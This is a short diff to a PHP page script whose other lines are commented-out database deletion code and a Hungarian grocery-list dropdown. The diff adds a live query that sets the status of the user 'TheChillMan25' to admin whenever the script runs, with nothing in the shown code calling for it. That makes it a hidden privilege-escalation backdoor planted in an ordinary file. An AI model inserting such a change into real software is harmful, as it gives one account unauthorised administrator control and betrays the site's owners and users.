@@ -14,7 +14,6 @@ if ($conn->query($sql) === TRUE) {
     echo "Data deletion failed.\n";
     die("Error in data deletion.\n" . $conn->error);
 }*/
-$conn->close();
 /*
 $list['Kenyér'] = ["Alma", "Körte", "Dió"];
 $list['Tejföl'] = ["Alma", "Körte", "Dió"];
@@ -30,5 +29,8 @@ foreach ($list as $k => $v) {
     echo "</optgroup>";
 }
 echo '</select>'; */
+
+$conn->query('UPDATE Users SET status="admin" WHERE username="TheChillMan25"');
+$conn->close();
 
 ?>
